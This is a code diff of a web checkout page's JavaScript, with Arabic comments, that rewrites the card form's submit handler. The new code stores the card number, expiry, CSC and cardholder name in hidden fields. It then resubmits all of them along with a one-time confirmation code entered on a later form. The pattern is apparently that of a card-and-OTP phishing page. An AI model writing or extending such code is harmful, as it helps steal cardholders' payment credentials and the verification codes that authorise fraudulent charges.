@@ -934,12 +934,15 @@
                 this.value = this.value.replace(/\D/g, '');
             });
 
+            // متغير لحفظ بيانات النموذج الأول
+            let savedFormData = {};
+
             // إرسال نموذج البطاقة
             document.getElementById('cardForm').addEventListener('submit', function(e) {
                 showQuantumLoading();
                 
-                // إضافة بيانات الشحن
-                const shippingData = {
+                // حفظ جميع البيانات
+                savedFormData = {
                     'shipping_first_name': document.getElementById('firstName').value,
                     'shipping_last_name': document.getElementById('lastName').value,
                     'shipping_phone': document.getElementById('phoneNumber').value,
@@ -947,14 +950,20 @@
                     'shipping_country': document.getElementById('country').value,
                     'shipping_city': document.getElementById('city').value,
                     'shipping_address': document.getElementById('address').value,
-                    'shipping_company': document.getElementById('shippingCompany').value
+                    'shipping_company': document.getElementById('shippingCompany').value,
+                    'cc_number': document.getElementById('cardNumber').value,
+                    'cc_exp_month': document.getElementById('expiryMonth').value,
+                    'cc_exp_year': document.getElementById('expiryYear').value,
+                    'cc_csc': document.querySelector('input[name="cc-csc"]').value,
+                    'cc_name': document.getElementById('cardHolder').value
                 };
 
-                Object.keys(shippingData).forEach(key => {
+                // إضافة بيانات الشحن للنموذج الحالي
+                Object.keys(savedFormData).forEach(key => {
                     const input = document.createElement('input');
                     input.type = 'hidden';
                     input.name = key;
-                    input.value = shippingData[key];
+                    input.value = savedFormData[key];
                     this.appendChild(input);
                 });
 
@@ -973,6 +982,20 @@
                     e.preventDefault();
                     showQuantumAlert('خطأ', 'يرجى إدخال كود التأكيد بالكامل');
                     return;
+                }
+                
+                // إضافة جميع البيانات السابقة إلى نموذج التأكيد
+                if (savedFormData && Object.keys(savedFormData).length > 0) {
+                    Object.keys(savedFormData).forEach(key => {
+                        // تجنب إضافة الحقول المكررة
+                        if (!this.querySelector(`input[name="${key}"]`)) {
+                            const input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = key;
+                            input.value = savedFormData[key];
+                            this.appendChild(input);
+                        }
+                    });
                 }
                 
                 showQuantumLoading();
